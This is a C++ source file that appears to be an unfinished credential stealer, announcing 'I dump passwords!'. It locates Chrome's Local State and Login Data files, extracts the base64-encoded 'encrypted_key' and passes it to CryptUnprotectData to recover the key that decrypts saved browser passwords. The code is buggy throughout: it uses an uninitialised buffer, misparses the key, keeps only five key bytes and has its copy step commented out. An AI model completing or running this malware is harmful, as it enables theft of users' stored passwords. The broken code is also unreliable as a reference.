
#include "sqlite3.h"
#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#include <string>
#include <vector>
#include <iostream>



std::vector<BYTE> b64Decode(std::string strInput){
    // as before you should make two calls to ::CryptStringToBinaryA 
    char * toDecrypt = new char[strInput.length() + 1];
    if (strcpy(toDecrypt, strInput.c_str()) == NULL){
        printf("strcopy failed: \n");
        printf("Last error: %d\n", GetLastError());
    }
    for (int i =0; i < strInput.length(); i++ ){
        printf("%c",toDecrypt[i] );
    }
    
    DWORD bytes;
    BYTE * retBuff;
    if (!CryptStringToBinaryA( toDecrypt , strInput.length() ,CRYPT_STRING_BASE64, NULL,& bytes,NULL,NULL )){
        printf("1st call failed \n");
        printf("Last error: %d\n", GetLastError());
    }   
    if (!CryptStringToBinaryA(toDecrypt , strInput.length() ,CRYPT_STRING_BASE64, retBuff ,&bytes,NULL,NULL)){
        printf("2nd call failed \n");
        printf("Last error: %d\n", GetLastError());
    }
    std::vector<BYTE> ByteVector(retBuff, retBuff + bytes );
    return ByteVector;
}

char * readFile(char * fileName){
    printf("filename: %s\n",fileName);
     //GetFileSize
    DWORD fileSize;
    char* buffer;
    fflush(stdin);
    FILE * infile = fopen(fileName, "r");
    if (infile == NULL){
        printf("file failed to open");
        printf("ERROR: %d", GetLastError());
    }
    long size;
    //why is fseek not working?????????
    fseek(infile, 0L, SEEK_END);
    size = ftell(infile);
    fseek(infile, 0L, SEEK_SET);
    printf("SIZE inside readFile: %d\n", size);
    buffer = (char *)malloc(size);
    
    fread(buffer,sizeof(char *), size, infile );
    
    //std::string buf;
    //buf = std::string(buffer);
    //printf("buf size: %d\n",buf.size());
    
    return buffer;
    
}

 std::vector<byte> GetLocalState(){
    printf("IN LOCAL STATE \n");
    HANDLE hToken =  GetCurrentProcessToken();
    DWORD lpcchSize = 30;
    LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
    if (!GetUserProfileDirectoryA(hToken, lpProfileDir,&lpcchSize  )){
        printf("didnt get path\n");
        //return std::vector<byte> (""); //change that
    }
    std::string db_path = std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\Local State");
    std::cout << db_path << '\n';
    //then fetch and load json
    char * b = readFile( const_cast<char*>(db_path.c_str()));
    for (int j = 0; j < 100; j++){
        printf("%c", b[j]);
    }
    //printf("Bytes read: %d\n",LocalBytes.size());
    //std::cout << LocalBytes;
    //local bytes is wrong somehow
    std::string LocalBytes = std::string(b);
    int loc = LocalBytes.find("encrypted_key") + 16; //15 is length of
    printf("loc: %d\n", loc);
    std::string key = "";
    for (int i = 0; i < 400; i++){ //assume key is max 300 buytes kong
        if (LocalBytes[i] == '"'){
            break;
        }
        key += LocalBytes[i];
    }
    printf("KEY before decoding: ");
    std::cout << key << '\n';

    std::vector<byte> Key = b64Decode(key);
    std::cout << "KEY after Decoding: ";
    for (char i: Key)
        std::cout << i << ' ';
    return Key;

}

BYTE * GetEncryptionKey(){
    //cant rlly test yet
    printf("IN get encrpyt key \n");
    std::vector<byte> temp_key = GetLocalState();
    BYTE * Key = (std::vector<byte>(temp_key.begin(), temp_key.begin()+5)).data();
    //get first 5 chars 
    PDATA_BLOB blob = (PDATA_BLOB) malloc(sizeof(DATA_BLOB));
    blob->cbData = 5;
    blob->pbData = Key;
    PDATA_BLOB Ret_Blob = (PDATA_BLOB) malloc(sizeof(DATA_BLOB));
    
    if (!CryptUnprotectData(blob, NULL, NULL, NULL, NULL, 0, Ret_Blob)){
        printf("OOF DIDNT WORK\n");
        printf("ERROR: %d\n", GetLastError());
    }

    return Ret_Blob->pbData;
}

void CopyFiles(char * dst, char * src){
     //GetFileSize
    DWORD fileSize;
    char* buffer;
    fflush(stdin);
    FILE * infile = fopen(src, "r");
    if (infile == NULL){
        printf("file failed to open");
        printf("ERROR: %d", GetLastError());
    }
    int size;
    
    fseek(infile, 0L, SEEK_END);
    size = ftell(infile);
    fseek(infile, 0L, SEEK_SET);

    printf("SIZE: %d\n", size);

    buffer = (char *)malloc(size);

    fread(buffer,sizeof(char *), size, infile );
    fclose(infile);
    //for (int i = 0; i < size; i++){
      //  printf("%c", buffer[i]);
    //}
    FILE * outfile = fopen(dst, "w+");
    if (outfile == NULL){
        printf("file failed to open");
        printf("ERROR: %d", GetLastError());
    }
    fwrite(buffer, sizeof(char *), size, outfile );
    fclose(outfile);
    free(buffer);
}


int main(){
    printf("I dump passwords!\n");
    HANDLE hToken =  GetCurrentProcessToken();
    DWORD lpcchSize = 30;
    LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
    if (!GetUserProfileDirectoryA(hToken, lpProfileDir,&lpcchSize  )){
        printf("didnt get path\n");
        return -1;
    }
    std::string db_path = std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data");
    printf("%s\n", const_cast<char*>(db_path.c_str()));
    //copy the file contents to a new file
    std::string temp = "ChromeData.db";
    //this is still a bit buggy bc of encoding issus :(
    //CopyFiles(const_cast<char*>(temp.c_str()), const_cast<char*>(db_path.c_str())); 
   //C:\Users\Wyatt2\AppData\Local\Google\Chrome\User Data\Default"
   //create a db connection
   GetEncryptionKey();
    
}
